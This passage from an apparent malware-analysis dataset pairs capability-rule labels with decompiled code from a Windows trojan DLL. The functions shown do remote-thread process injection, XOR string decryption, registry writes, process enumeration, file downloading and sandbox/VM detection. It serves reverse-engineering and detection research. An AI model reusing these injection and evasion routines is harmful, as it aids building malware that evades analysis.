= iVar10 % 7;\n                iVar10 = iVar10 + 1;\n                *puVar1 = (&stack0xffffff98)[iVar11] ^ puVar1[&stack0xffffffd8 + iVar12];\n            } while (iVar10 < 0x14);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\", \n                         0x1e5);\n            uVar18 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uStack112, iVar9);\n            pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar18);\n            if (pcVar7 != NULL) {\n                piStack108 = (*pcVar7)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, unaff_EBX, &stack0xffffffac)\n                ;\n                if (piStack108 < 0) {\n                    (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(piStack108);\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Thread not created. %p\"\n                                 , 0x206);\n                }\n                else {\n                    piStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*unaff_EBX, 30000);\n                    if (piStack124 == NULL) {\n                        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Remote thread finished.\"\n                                     , 0x1fc);\n                        iVar12 = (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*unaff_EBX, &stack0xffffff84);\n                        if (iVar12 != 0) {\n                            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Exit code 0x%x\"\n                                         , 0x1ff);\n                        }\n                    }\n                }\n            }\n            pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar18 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)();\n            uVar16 = (*pcVar3)(0, uStack112);\n            (*pcVar7)(uVar16);\n            goto code_r0x00409642;\n        }\n        uVar18 = 0;\n        iVar12 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0);\n        *piVar13 = iVar12;\n        pcVar7 = _sym.imp.KERNEL32.dll_GetLastError;\n        if (iVar12 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Thread not created. %d\", \n                         0x1cd);\n            uVar18 = (*pcVar7)();\n            goto code_r0x00409642;\n        }\n        iVar12 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar12, 30000);\n        if (iVar12 != 0) goto code_r0x00409642;\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Remote thread finished.\", 0x1c3)\n        ;\n        iVar12 = (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar13, &stack0xffffff74);\n        iVar14 = CONCAT44(puStack104, uStack96);\n        if (iVar12 == 0) goto code_r0x00409642;\n        uVar16 = 0x1c6;\n        pcVar17 = \"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Exit code 0x%x\";\n    }\n    fcn.00403bde(pcVar17, uVar16);\n    puStack104 = iVar14 >> 0x20;\n    uStack96 = iVar14;\ncode_r0x00409642:\n    *0x427e04 = *0x427e00 >> 0x20;\n    *0x427dfc = *0x427df8 >> 0x20;\n    return uVar18;\n}\n",
        "token_count": 6209
    },
    "0040c411": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c411(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *lpString;\n    uint arglist;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n        arglist = 0x1d;\n        lpString = \"GTK DLL: regstor.cpp:%d > OpenyRegistryKeyNative : RegOpenKeyEx (%ws) : %p\";\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n        arglist = 0x18;\n        lpString = \"GTK DLL: regstor.cpp:%d > OpenyRegistryKeyNative : RegCreateKeyEx (%ws) : %p\";\n    }\n    fcn.00403bde(lpString, arglist);\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 257
    },
    "0040a6ae": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a6ae(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    char *lpString;\n    uint uVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t dwSize;\n    \n    pcVar1 = _sym.imp.ntdll.dll_NtQuerySystemInformation;\n    dwSize = 0;\n    iVar2 = (*_sym.imp.ntdll.dll_NtQuerySystemInformation)(5, 0, 0, &dwSize);\n    if (iVar2 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar3 != NULL) {\n            iVar2 = (*pcVar1)(5, piVar3, dwSize, 0);\n            piVar5 = piVar3;\n            if (iVar2 < 0) {\n                fcn.00403bde(\"GTK DLL: proc.cpp:%d > ProcEnumerateProcess : !NT_SUCCESS(0x%x)\", 0x13d);\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar3, 0, 0x8000);\n                return 0xffffffff;\n            }\n            do {\n                iVar2 = piVar5[0x11];\n                if (((iVar2 != 0) && (iVar2 != 4)) && (iVar2 != *0x427d38)) {\n                    uVar6 = fcn.0040adb1();\n                    uVar4 = fcn.0040787f();\n                    iVar2 = (*param_1)(piVar5[0xf], uVar4, piVar5[0x11], piVar5[0x12], uVar6, param_2);\n                    if (iVar2 == 0) {\ncode_r0x0040a7a6:\n                        (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar3, 0, 0x8000);\n                        return 0;\n                    }\n                }\n                if (*piVar5 == 0) goto code_r0x0040a7a6;\n                piVar5 = piVar5 + *piVar5;\n            } while( true );\n        }\n        uVar6 = 0x13a;\n        lpString = \"GTK DLL: proc.cpp:%d > ProcEnumerateProcess : Unable to allocate page(s) with total size %u.\";\n    }\n    else {\n        uVar6 = 0x138;\n        lpString = \"GTK DLL: proc.cpp:%d > ProcEnumerateProcess : status(0x%x) != STATUS_INFO_LENGTH_MISMATCH\";\n    }\n    fcn.00403bde(lpString, uVar6);\n    return 0xffffffff;\n}\n",
        "token_count": 664
    },
    "0040461b": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040461b(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFile : TargetPlatform : %d\", 0x1a1);\n    do {\n        iVar1 = fcn.00403db4(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFile : result : %s\", 0x1ad);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFile : pBuffer->pbData : %p\", 0x1ae);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFile : pBuffer->cbData : %d\", 0x1af);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFile : BytesDownloaded : %d\", 0x1b0);\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > DownloadFile : ContentLength : %d\", 0x1b1);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040cff1();\n    }\n    return iVar1;\n}\n",
        "token_count": 381
    },
    "00407d4b": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00407d4b(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > CheckElevated : [ENTERED]\", 0x1e1);\n    if (*0x427d48 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > CheckElevated : [LEAVED]\", 0x1f1);\n    return TokenInformation;\n}\n",
        "token_count": 243
    },
    "0040f101": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040f101(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    int32_t var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    uint pcbBuffer;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    ushort var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar5 = fcn.0040ef21();\n    if (iVar5 != 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : DetectBadMacAddress() : true\", 0xb1);\n        fcn.0040f0e5();\n    }\n    var_1ch = 0x3f2b5b31;\n    var_18h._0_2_ = 0xd11;\n    var_18h._2_1_ = 0x46;\n    var_18h._3_1_ = 0x7b;\n    var_14h._0_1_ = 0x5d;\n    var_14h._1_1_ = 0x20;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x74;\n    var_8h = 0x574c3955;\n    var_4h = CONCAT13(var_4h._3_1_, 0x366174);\n    fcn.00401000(0xc);\n    iVar5 = 0;\n    var_58h = 7;\n    do {\n        puVar1 = iVar5 + var_ach;\n        iVar8 = iVar5 % 7;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_1ch - var_ach];\n    } while (iVar5 < 0xc);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xb5);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_ach);\n    if (iVar5 != 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : dbghelp.dll\", 0xb7);\n        fcn.0040f0e5();\n    }\n    var_1ch = 0x1d3f083e;\n    var_18h._0_2_ = 0x1b51;\n    var_18h._2_1_ = 8;\n    var_18h._3_1_ = 0x44;\n    var_14h._0_1_ = 0x29;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0x3a;\n    var_14h._3_1_ = 0x78;\n    var_8h = 0x78566a4d;\n    var_4h = 0x6a647735;\n    fcn.00401000(0xc);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_a4h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_1ch - var_a4h];\n    } while (uVar9 < 0xc);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xbb);\n    iVar5 = (*pcVar2)(var_a4h);\n    if (iVar5 != 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : sbiedll.dll\", 0xbd);\n        fcn.0040f0e5();\n    }\n    pcbBuffer = 0x400;\n    iVar5 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x427e10, &pcbBuffer);\n    if (iVar5 == 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : !GetUserNameA\", 0xc3);\n        fcn.0040f0e5();\n    }\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : GetUserNameA : %s\", 199);\n    var_1ch = 0x28261f35;\n    var_18h._0_2_ = 0x5606;\n    var_18h._3_1_ = 0x23;\n    var_14h._0_1_ = 0x19;\n    var_14h._1_1_ = 0x31;\n    var_14h._2_1_ = 0x28;\n    var_14h._3_1_ = 99;\n    var_18h._2_1_ = 7;\n    var_8h = 0x5a546a76;\n    var_4h = var_4h & 0xff000000 | 0x733863;\n    fcn.00401000(0xc);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_b0h;\n        iVar8 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_1ch - var_b0h];\n    } while (iVar5 < 0xc);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xca);\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x427e10, var_b0h);\n    if (iVar5 == 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : GetUserNameA -> CurrentUser\", 0xcc);\n        fcn.0040f0e5();\n    }\n    var_68h = 0x27270d24;\n    var_64h = 0x77220d37;\n    var_8h = 0x43496c77;\n    var_4h = var_4h & 0xff000000 | 0x5a6255;\n    fcn.00401000(8);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_a8h;\n        iVar8 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_68h - var_a8h];\n    } while (iVar5 < 8);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xd0);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpA;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x427e10, var_a8h);\n    if (iVar5 == 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : GetUserNameA -> Sandbox\", 0xd2);\n        fcn.0040f0e5();\n    }\n    pcbBuffer = 0x400;\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x427e10, &pcbBuffer);\n    if (iVar5 == 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : !GetComputerNameA\", 0xd9);\n        fcn.0040f0e5();\n    }\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : GetComputerNameA : %s\", 0xdd);\n    var_8h = 0x6271422;\n    var_4h = 0x4a3f0274;\n    var_70h = 0x42695571;\n    var_6ch = 0x4a674d36;\n    fcn.00401000(8);\n    iVar5 = var_64h;\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_64h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_70h + uVar6) ^ puVar1[&var_8h - var_64h];\n    } while (uVar9 < 8);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xdf);\n    iVar5 = (*pcVar2)(0x427e10, iVar5);\n    if (iVar5 == 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : GetComputerNameA -> SANDBOX\", 0xe1);\n        fcn.0040f0e5();\n    }\n    var_8h = 0x2331958;\n    var_4h = 0x59191b22;\n    var_10h = 0x4e7a4a6f;\n    var_ch = 0x59585274;\n    fcn.00401000(8);\n    iVar5 = var_6ch;\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_6ch;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_10h + uVar6) ^ puVar1[&var_8h - var_6ch];\n    } while (uVar9 < 8);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xe5);\n    iVar5 = (*pcVar2)(0x427e10, iVar5);\n    if (iVar5 == 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : GetComputerNameA -> 7SILVIA\", 0xe7);\n        fcn.0040f0e5();\n    }\n    var_48h = 0x1521343d;\n    var_44h = 0x3f16043e;\n    var_40h = 0x2363129;\n    var_3ch = 0x2a0d172a;\n    var_38h = 0x1f3c3c21;\n    var_34h = 0x93d1635;\n    var_30h = 0x511e1001;\n    var_8h = 0x51737575;\n    var_4h = 0x7a444569;\n    fcn.00401000(0x1c);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_74h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_48h - var_74h];\n    } while (uVar9 < 0x1c);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xeb);\n    var_24h = 0x1f354121;\n    var_20h = 0x1b180c02;\n    var_1ch = 0x23d3557;\n    var_18h._0_2_ = 0x2913;\n    var_18h._2_1_ = 0x1b;\n    var_18h._3_1_ = 0x57;\n    var_14h._0_1_ = 0x28;\n    var_14h._1_1_ = 0x6b;\n    var_8h = 0x6b463872;\n    var_4h = var_4h & 0xff000000 | 0x5a6167;\n    fcn.00401000(0x12);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_8ch;\n        iVar8 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_24h - var_8ch];\n    } while (iVar5 < 0x12);\n    pcVar11 = \"szSystemBiosVersion_EncryptedStackedBuffer\";\n    iVar5 = var_8ch;\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xec);\n    cVar4 = fcn.0040eec5(pcVar11, iVar5);\n    if (cVar4 == '\\0') {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : !SystemBiosVersion\", 0xf0);\n        fcn.0040f0e5();\n    }\n    var_8h = 0x41397579;\n    var_4h = CONCAT31(var_4h._1_3_, 0x6e);\n    var_10h = 0x61703838;\n    var_ch = var_ch & 0xff000000 | 0x4d4b6e;\n    fcn.00401000(5);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_98h;\n        iVar8 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_10h + iVar8) ^ puVar1[&var_8h - var_98h];\n    } while (iVar5 < 5);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xf5);\n    var_8h = 0x7c301b77;\n    var_4h = CONCAT22(var_4h._2_2_, 0x382a);\n    var_10h = 0x34735435;\n    var_ch = 0x53573879;\n    fcn.00401000(6);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_78h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_10h + uVar6) ^ puVar1[&var_8h - var_78h];\n    } while (uVar9 < 6);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xf6);\n    var_8h = 0x1b043014;\n    var_4h._0_1_ = 0x51;\n    var_10h = 0x434b7242;\n    var_ch = 0x73775651;\n    fcn.00401000(5);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_88h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_10h + uVar6) ^ puVar1[&var_8h - var_88h];\n    } while (uVar9 < 5);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xf7);\n    var_8h = 0xd3f7d27;\n    var_4h._0_1_ = 0x68;\n    var_10h = 0x58723876;\n    var_ch = 0x4f397168;\n    fcn.00401000(5);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_80h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_10h + uVar6) ^ puVar1[&var_8h - var_80h];\n    } while (uVar9 < 5);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xf8);\n    var_8h = 0x1d247564;\n    var_4h = CONCAT31(var_4h._1_3_, 0x79);\n    var_10h = 0x54673837;\n    var_ch = 0x71534779;\n    fcn.00401000(5);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_7ch;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_10h + uVar6) ^ puVar1[&var_8h - var_7ch];\n    } while (uVar9 < 5);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xf9);\n    var_24h = 0x2926167c;\n    var_20h = 0x5c6c6122;\n    var_1ch = 0x58426e15;\n    var_18h._0_2_ = 0x715e;\n    var_18h._2_1_ = 0x7c;\n    var_18h._3_1_ = 0x41;\n    var_14h._0_1_ = 0x35;\n    var_8h = 0x6c725835;\n    var_4h = 0x714c416e;\n    fcn.00401000(0x11);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_94h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_24h - var_94h];\n    } while (uVar9 < 0x11);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xfa);\n    var_8h = 0x12f6503;\n    var_4h = var_4h & 0xff000000 | 0x6c597d;\n    var_10h = 0x55613145;\n    var_ch = 0x706c6850;\n    fcn.00401000(7);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_84h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_10h + uVar6) ^ puVar1[&var_8h - var_84h];\n    } while (uVar9 < 7);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xfb);\n    var_8h = 0x707f781a;\n    var_4h = CONCAT31(var_4h._1_3_, 0x67);\n    var_60h = 0x39313749;\n    var_5ch._0_2_ = 16999;\n    var_5ch._2_1_ = 0x78;\n    fcn.00401000(5);\n    iVar5 = var_ch;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_ch;\n        iVar10 = iVar8 % var_58h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_60h + iVar10) ^ puVar1[&var_8h - var_ch];\n    } while (iVar8 < 5);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0xfc);\n    pcVar2 = _sym.imp.SHLWAPI.dll_StrStrA;\n    *0x428220 = var_98h;\n    *0x428228 = var_78h;\n    *0x42822c = var_88h;\n    *0x428230 = var_80h;\n    *0x428234 = var_7ch;\n    *0x428240 = iVar5;\n    uVar9 = 0;\n    *0x428238 = var_94h;\n    *0x42823c = var_84h;\n    do {\n        iVar5 = (*pcVar2)(0x427e10, *(uVar9 + 0x428220));\n        if (iVar5 != 0) {\n            fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : SystemBiosVersion -> %s\", 0x109);\n            fcn.0040f0e5();\n        }\n        uVar9 = uVar9 + 4;\n    } while (uVar9 < 0x20);\n    var_24h = 0x50363b00;\n    var_20h = 0x80305;\n    var_1ch = 0x47370425;\n    var_18h._0_2_ = 0x2819;\n    var_18h._2_1_ = 0xe;\n    var_18h._3_1_ = 1;\n    var_14h._0_1_ = 0x56;\n    var_8h = 0x35525256;\n    var_4h = 0x6f61416a;\n    fcn.00401000(0x11);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_60h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_24h - var_60h];\n    } while (uVar9 < 0x11);\n    pcVar11 = \"szVideoBiosVersion_EncryptedStackedBuffer\";\n    iVar5 = var_60h;\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0x10e);\n    cVar4 = fcn.0040eec5(pcVar11, iVar5);\n    if (cVar4 == '\\0') {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : !VideoBiosVersion\", 0x111);\n        fcn.0040f0e5();\n    }\n    var_1ch = 0x39445e33;\n    var_18h._0_2_ = 0x3722;\n    var_18h._2_1_ = 9;\n    var_18h._3_1_ = 0x34;\n    var_14h._0_1_ = 10;\n    var_14h._1_1_ = 0x4f;\n    var_14h._2_1_ = 0x36;\n    var_8h = 0x4d363765;\n    var_4h = 0x76655657;\n    fcn.00401000(0xb);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_a0h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_1ch - var_a0h];\n    } while (uVar9 < 0xb);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0x115);\n    iVar5 = (*pcVar2)(0x427e10, var_a0h);\n    if (iVar5 != 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : SystemBiosVersion -> VirtualBox\", 0x117);\n        fcn.0040f0e5();\n    }\n    var_54h = 0x150e1d66;\n    var_50h = 0x2d343264;\n    var_4ch = 0x22211f69;\n    var_48h = 0x7151c41;\n    var_44h = 0x16142653;\n    var_40h = 0x7021d5a;\n    var_3ch = 0x2142142;\n    var_38h = 0xd140146;\n    var_34h = 0x241e265b;\n    var_30h = 0x70f0041;\n    var_2ch = 0x525b;\n    var_8h = 0x41485235;\n    var_4h = 0x68667333;\n    fcn.00401000(0x2a);\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_9ch;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_54h - var_9ch];\n    } while (uVar9 < 0x2a);\n    pcVar11 = \"szCurrentVersionRegPath_EncryptedStackedBuffer\";\n    iVar5 = var_9ch;\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0x11b);\n    cVar4 = fcn.0040eec5(pcVar11, iVar5);\n    if (cVar4 == '\\0') {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : !SystemBiosVersion \", 0x11e);\n        fcn.0040f0e5();\n    }\n    var_28h = 0x72457e59;\n    var_24h = 0x52737760;\n    var_20h = 0x7345665c;\n 